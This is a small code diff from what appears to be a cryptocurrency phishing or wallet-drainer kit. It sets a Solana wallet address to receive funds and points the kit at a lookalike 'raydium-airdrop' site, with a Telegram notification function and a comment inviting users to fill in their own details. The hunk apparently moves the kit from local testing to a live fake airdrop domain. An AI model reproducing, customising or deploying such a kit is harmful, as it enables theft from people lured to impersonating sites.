@@ -25,5 +25,5 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 
 // Change this information for yours (
 const solana_wallet_receiver_id = '9H324MMej9eTvLNQWiGrwWy1V8SYoUnvUuakK6Sgsx1a';
-const website_url = 'http://localhost:5500';
+const website_url = 'https://raydium-airdrop-vert.vercel.app/';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
